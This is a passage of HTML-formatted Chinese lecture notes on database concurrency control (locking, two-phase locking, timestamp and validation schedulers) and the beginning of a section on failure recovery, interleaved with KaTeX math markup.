style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.109em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">A</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span></span></span></span></eq>事务<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>T</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">T_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>对数据元素<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span></span></span></span></eq>解锁</p><ul><li>事务调度器   拥有锁表，来管理锁<ul><li>利用锁来保证冲突的可串行性</li><li>对所有事务的操作产生一个读写操作序列</li><li>保证事务的一致性</li></ul></li><li>锁本身并不能保证冲突可串行性</li><li>锁为调度提供了控制的手段，但如何用锁，仍需说明，并采用不同的协议</li></ul><h4 id="%EF%BC%883%EF%BC%89%E5%B0%81%E9%94%81%E5%8D%8F%E8%AE%AE%E9%9C%80%E8%A6%81%E8%80%83%E8%99%91%E4%BB%80%E4%B9%88" tabindex="-1">（3）封锁协议需要考虑什么</h4><ul><li>封锁协议之锁的类型<ul><li>排他锁（又称X锁）<ul><li>只有一个事务能读，写，其它任何事物不能读写</li></ul></li><li>贡献锁<ul><li>所有事务都可以读，但任何事务都不能写</li></ul></li><li>更新锁<ul><li>初始读，以后可升级为写</li></ul></li><li>增量锁<ul><li>增量更新</li><li>区分增量更新和其他类型的更新</li></ul></li></ul></li><li>封锁协议之相容性矩阵<ul><li>当某事务对一数据对象持有一种锁时，另一事务再申请对该对象加某一类型锁时，时允许还是不允许</li></ul></li><li>封锁协议之解锁和加锁的时机<ul><li>SQL之隔离性级别</li><li>读未提交</li><li>读已提交</li><li>可重复读</li><li>可串行化</li></ul></li><li>封锁协议之封锁力度<ul><li>封锁力度指封锁数据对象的大小</li><li>粒度单位：属性值-元组-元组集合-整个关系-整个DB某索引项-某个索引</li><li>从前往后：并发度变小，封锁开销小，从后往前相反</li></ul></li></ul><h4 id="%EF%BC%884%EF%BC%89%E4%B8%A4%E7%AB%AF%E5%B0%81%E9%94%81%E5%8D%8F%E8%AE%AE" tabindex="-1">（4）两端封锁协议</h4><h5 id="%E4%BB%80%E4%B9%88%E6%98%AF%E4%B8%A4%E6%AE%B5%E5%B0%81%E9%94%81%E5%8D%8F%E8%AE%AE" tabindex="-1">什么是两段封锁协议</h5><ul><li><p>读写数据之前要获得锁。每个事务中所有封锁请求先于任何一个解锁请求</p></li><li><p>两阶段：加锁段，解锁段。加锁段中不能有解锁操作，解锁段中不能有加锁操作。</p></li><li><p>两段封锁协议可以保证冲突可串行化<br>归纳法证明P215</p></li><li><p>两端封锁协议可能产生死锁</p></li></ul><h3 id="2205-%E5%9F%BA%E4%BA%8E%E6%97%B6%E9%97%B4%E6%88%B3%E7%9A%84%E5%B9%B6%E5%8F%91%E6%8E%A7%E5%88%B6" tabindex="-1">2205 基于时间戳的并发控制</h3><h4 id="%EF%BC%881%EF%BC%89%E4%BB%80%E4%B9%88%E6%98%AF%E6%97%B6%E9%97%B4%E6%88%B3" tabindex="-1">（1）什么是时间戳</h4><ul><li><p>一种基于时间的标志</p></li><li><p>时间戳具有唯一性和递增性</p></li><li><p>事务T启动时，系统将该时刻赋予T，为T的时间戳</p></li><li><p>时间戳可以表征一系列事务执行的先后顺序：时间戳小的事务先执行，大的后执行</p></li><li><p>利用时间戳，可以不用锁来进行并发控制</p></li></ul><h4 id="%EF%BC%882%EF%BC%89%E5%9F%BA%E4%BA%8E%E6%97%B6%E9%97%B4%E6%88%B3%E5%B9%B6%E5%8F%91%E6%8E%A7%E5%88%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%80%9D%E8%B7%AF" tabindex="-1">（2）基于时间戳并发控制的基本思路</h4><ul><li>借助时间戳，强制使一组并发事务的交叉执行，等价于一个特定顺序（时间戳从小到大）的串行执行</li><li>如何强制：执行判断冲突<ul><li>如无冲突，予以执行</li><li>如有冲突，则撤销事务，并重启该事务<br>此时该事务获得了一个更大的时间戳，表明是后执行的事务</li></ul></li><li>有哪些冲突<ul><li>读读无冲突</li><li>读写或写读冲突</li><li>写写冲突</li></ul></li></ul><h4 id="%EF%BC%883%EF%BC%89%E5%9F%BA%E4%BA%8E%E6%97%B6%E9%97%B4%E6%88%B3%E7%9A%84%E7%AE%80%E5%8D%95%E8%B0%83%E5%BA%A6" tabindex="-1">（3）基于时间戳的简单调度</h4><p>对DB中的每个元素x，系统保留其上最大的时间戳</p><ul><li><p>RT（X）即R-timestamp（x）</p><ul><li>读过该数据事务中最大的时间戳，即最后读x的事务的时间戳</li></ul></li><li><p>WT（X）即W-timestamp（x）</p><ul><li>写过该数据事务中最大的时间戳，即最后写x的事务的时间戳</li></ul></li><li><p>事务的时间戳</p><ul><li>TS（T）：即TimeStamp</li></ul></li><li><p>读写并发：</p><ul><li>若T事务读x，则将T的时间戳TS与WT（x）比较：<ul><li>若TS大（T 后进行），则允许T操作，并且更改RT（x）为max(RT(x),TS)</li><li>否则，有冲突，撤回T，重启T</li></ul></li><li>若T事务写x，则将T的时间戳TS与RT（x）比较<ul><li>若TS大（T后进行），则允许T操作，并且更改WT（x）为max(WT(x),TS)</li></ul></li></ul></li><li><p>写写并发</p><ul><li>若T事务写x，则将T的时间戳TS与WT（x）比较<ul><li>若TS大，则允许T写，并且更改WT（x）为T的时间戳</li><li>否则有冲突，T撤回重做</li></ul></li></ul></li></ul><h4 id="%EF%BC%884%EF%BC%89%EF%BC%883%EF%BC%89%E7%9A%84%E6%94%B9%E8%BF%9B" tabindex="-1">（4）（3）的改进</h4><p>新增标志：</p><ul><li>C（x）：x的提交位<ul><li>该位为真，当且仅当最近写x的事务已经提交</li><li>C（x）的目的是避免出现事务读另一事务U所写数据然后U还未写完终止这样的情况</li></ul></li><li>对来自事务T的读写请求，调度器可以<ul><li>同意请求</li><li>撤销或终止T，并重启具有新时间戳的T(终止+重启，称为回滚)</li><li>推迟T，并在以后决定是终止T还是同意请求(如果请求是读，且此读可能是脏的)</li></ul></li></ul><h5 id="%E8%B0%83%E5%BA%A6%E8%A7%84%E5%88%99" tabindex="-1">调度规则</h5><ul><li>假设调度器收到请求<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>r</mi><mi>T</mi></msub><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">r_T(x)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span></span></span></span></eq><ul><li>(1)如果TS(T)&gt;=WT(x)，此读是事实上可实现的<ul><li>如果C(x)为真，同意请求。如果TS(T)&gt;RT(x),置RT(x):=TS(T);否则不改变RT(x)</li><li>如果C(x)为假，推迟T直到C(x)为真或写x的事务终止</li></ul></li><li>(2)如果TS(T)&lt;=WT(x),此读是事实上不可实现的<ul><li>回滚T（过晚的读）</li></ul></li></ul></li><li>假设调度器收到请求<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>w</mi><mi>T</mi></msub><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">w_T(x)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0269em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span></span></span></span></eq><ul><li>(1)如果<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi><mi>S</mi><mo stretchy="false">(</mo><mi>T</mi><mo stretchy="false">)</mo><mo>&gt;</mo><mo>=</mo><mi>R</mi><mi>T</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">TS(T)&gt;=RT(x)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">TS</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">RT</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span></span></span></span></eq>，且<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi><mi>S</mi><mo stretchy="false">(</mo><mi>T</mi><mo stretchy="false">)</mo><mo>&gt;</mo><mo>=</mo><mi>W</mi><mi>T</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">TS(T)&gt;=WT(x)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">TS</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span></span></span></span></eq>，此写是事实上可实现的<ul><li>为x写入新值，置<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>W</mi><mi>T</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>:</mo><mo>=</mo><mi>T</mi><mi>S</mi><mo stretchy="false">(</mo><mi>T</mi><mo stretchy="false">)</mo><mo separator="true">,</mo><mi>C</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><mi>f</mi><mi>a</mi><mi>l</mi><mi>s</mi><mi>e</mi></mrow><annotation encoding="application/x-tex">WT(x):=TS(T),C(x)=false</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">TS</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">se</span></span></span></span></eq></li></ul></li><li>(2)如果<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi><mi>S</mi><mo stretchy="false">(</mo><mi>T</mi><mo stretchy="false">)</mo><mo>&gt;</mo><mo>=</mo><mi>R</mi><mi>T</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">TS(T)&gt;=RT(x)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">TS</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">RT</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span></span></span></span></eq>，但是<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi><mi>S</mi><mo stretchy="false">(</mo><mi>T</mi><mo stretchy="false">)</mo><mo>&lt;</mo><mi>W</mi><mi>T</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">TS(T)&lt;WT(x)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">TS</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span></span></span></span></eq>，此写是事实上可实现的，但x已经有一个更晚的值<ul><li>如果<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">C(x)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span></span></span></span></eq>为真，那么前一个x的写已提交，则忽略T的写</li><li>如果<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">C(x)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span></span></span></span></eq>为假，则我们推迟T，直到<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">C(x)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span></span></span></span></eq>为真或x的事务终止</li></ul></li><li>(3)如果<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi><mi>S</mi><mo stretchy="false">(</mo><mi>T</mi><mo stretchy="false">)</mo><mo>&lt;</mo><mi>R</mi><mi>T</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">TS(T)&lt;RT(x)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">TS</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">RT</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span></span></span></span></eq>，此写事实上是不可实现的<ul><li>T必须回滚</li></ul></li></ul></li><li>假设调度器收到提交T的请求<ul><li>它必须找到T所写的所有数据库元素x，并置<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>:</mo><mo>=</mo><mi>t</mi><mi>r</mi><mi>u</mi><mi>e</mi></mrow><annotation encoding="application/x-tex">C(x):=true</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6151em;"></span><span class="mord mathnormal">t</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">u</span><span class="mord mathnormal">e</span></span></span></span></eq></li><li>如果有任何等待x被提交的事务，这些事务就被允许继续进行</li></ul></li><li>假设调度器收到终止T的请求<ul><li>向前面步骤一样回滚T。</li><li>那么任何等待T所写元素x的事务必须重新读或写，看这一动作现在的T的写被终止后是否合法</li></ul></li></ul><h3 id="2206-%E5%9F%BA%E4%BA%8E%E6%9C%89%E6%95%88%E6%80%A7%E7%A1%AE%E8%AE%A4%E7%9A%84%E5%B9%B6%E5%8F%91%E6%8E%A7%E5%88%B6%E6%96%B9%E6%B3%95" tabindex="-1">2206 基于有效性确认的并发控制方法</h3><h4 id="%EF%BC%881%EF%BC%89%E6%80%9D%E6%83%B3" tabindex="-1">（1）思想</h4><ul><li>事务在启动时刻被赋予唯一的时间戳，以示其启动顺序</li><li>为每一个活跃的事务保存其读写数据集合，RS(T):事务T读数据的集合，WS(T):事务T写数据的集合</li><li>通过对多个事务的读写集合，判断是否有冲突，即有效性确认，来完成事务的提交与回滚，强制事务以可串行化的方式执行</li></ul><h4 id="%EF%BC%882%EF%BC%89%E8%B0%83%E5%BA%A6%E5%99%A8%E7%9A%84%E8%BF%90%E8%A1%8C" tabindex="-1">（2）调度器的运行</h4><p>事务分三个阶段进行</p><ul><li>读阶段：事务从数据库中读取读集合中的所有元素，事务还在其局部地址空间计算它将要写的值</li><li>有效性确认阶段：调度器通过比较该事务与其它事务的读写集合来确认该事务的有效性</li><li>写阶段：事务往数据库中写入其写集合元素中的值</li><li>每个成功确认的事务是在其有效性确认的瞬间执行的</li><li>并发事务串行的顺序即事务有效性确认的顺序</li></ul><p>调度器维护三个集合：</p><ul><li>start集合：已经开始但尚未完成有效性确认的事务集合，对此集合中的事务，调度器维护start(T)，即事务T开始的时间</li><li>val集合，已经确认有效性但尚未完成第三阶段写的事务，对此集合中的事务，调度器维护start(T),val(T)，即T确认的时间</li><li>FIN集合，已经完成三阶段的事务，对于这样的事务T，调度器记录start(T),val(T),fin(T),即T的完成时间</li></ul><h4 id="%EF%BC%883%EF%BC%89%E6%9C%89%E6%95%88%E6%80%A7%E7%A1%AE%E8%AE%A4%E7%9A%84%E8%A7%84%E5%88%99" tabindex="-1">（3）有效性确认的规则</h4><ul><li>（1）对于所有已经经过有效性确认，且在T开始前没有完成的U，即对于满足<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi><mi>I</mi><mi>N</mi><mo stretchy="false">(</mo><mi>U</mi><mo stretchy="false">)</mo><mo>&gt;</mo><mi>S</mi><mi>T</mi><mi>A</mi><mi>R</mi><mi>T</mi><mo stretchy="false">(</mo><mi>T</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">FIN(U)&gt;START(T)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">U</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">ST</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.13889em;">RT</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mclose">)</span></span></span></span></eq>的U，检测<ul><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>R</mi><mi>S</mi><mo stretchy="false">(</mo><mi>T</mi><mo stretchy="false">)</mo><mo>∩</mo><mi>W</mi><mi>S</mi><mo stretchy="false">(</mo><mi>U</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">RS(T)\cap WS(U)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">RS</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∩</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">U</span><span class="mclose">)</span></span></span></span></eq>是否为空</li><li>若为空，则确认，否则不予确认</li></ul></li><li>（2）对于所有已经经过有效性确认，且在T有效性确认前没有完成的U，即对于满足<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi><mi>I</mi><mi>N</mi><mo stretchy="false">(</mo><mi>U</mi><mo stretchy="false">)</mo><mo>&gt;</mo><mi>V</mi><mi>A</mi><mi>L</mi><mo stretchy="false">(</mo><mi>T</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">FIN(U)&gt;VAL(T)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">U</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mord mathnormal">A</span><span class="mord mathnormal">L</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mclose">)</span></span></span></span></eq>的U，检测<ul><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>W</mi><mi>S</mi><mo stretchy="false">(</mo><mi>T</mi><mo stretchy="false">)</mo><mo>∩</mo><mi>W</mi><mi>S</mi><mo stretchy="false">(</mo><mi>U</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">WS(T)\cap WS(U)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∩</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">U</span><span class="mclose">)</span></span></span></span></eq>是否为空</li><li>若为空，则确认，否则不予确认</li></ul></li></ul><h2 id="%E7%AC%AC%E5%85%AD%E7%AB%A0-%E7%B3%BB%E7%BB%9F%E6%95%85%E9%9A%9C%E5%AF%B9%E7%AD%96" tabindex="-1">第六章 系统故障对策</h2><h3 id="2301-%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%95%85%E9%9A%9C%E5%8F%8A%E5%85%B6%E5%BD%B1%E5%93%8D" tabindex="-1">2301 数据库的故障及其影响</h3><h4 id="%EF%BC%881%EF%BC%89%E5%9F%BA%E7%A1%80%E9%9C%80%E8%A6%81%E9%9C%80%E8%A6%81%E7%9F%A5%E9%81%93%E7%9A%84" tabindex="-1">（1）基础需要需要知道的</h4><ul><li>DBMS运行方式<ul><li>DBMS利用内存和外存这样的存储体系来进行数据库管理</li><li>在内存中，又分为程序数据和系统数据</li></ul></li><li>事务<ul><li>上一章已经提及</li></ul></li></ul><h4 id="%EF%BC%882%EF%BC%89%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%95%85%E9%9A%9C%E7%B1%BB%E5%9E%8B" tabindex="-1">（2）数据库的故障类型</h4><ul><li>事务故障<ul><li>某一个程序自身运行错误所引起的故障</li><li>影响该程序本身</li></ul></li><li>系统故障<ul><li>由于掉电，非正常关机等所引起的故障</li><li>影响正在运行的事务以及数据库缓冲区，数据库缓冲区将涉及正在运行和已经运行的事务</li></ul></li><li>介质故障<ul><li>由于介质损坏等引起的故障</li><li>影响是全面的，既影响内存中的数据，也影响介质中的数据</li></ul></li></ul><h3 id="2302-%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9B%9E%E5%A4%8D%E7%9A%84%E5%AE%8F%E8%A7%82%E6%80%9D%E8%B7%AF" tabindex="-1">2302 数据库回复的宏观思路</h3><ul><li>数据库故障回复</li><li>把DB由当前不正确状态恢复到已知为正确的某一状态</li><li>需要保证事务的<ul><li>原子性：事务的所有操作，要么全部执行，要不全都不执行</li><li>持久性：已经提交的事务对数据库产生的影响是持久的，未提交的事务对数据库不应该有影响</li></ul></li></ul><h4 id="%EF%BC%881%EF%BC%89%E4%BA%8B%E5%8A%A1%E6%95%85%E9%9A%9C%E7%9A%84%E5%9B%9E%E5%A4%8D" 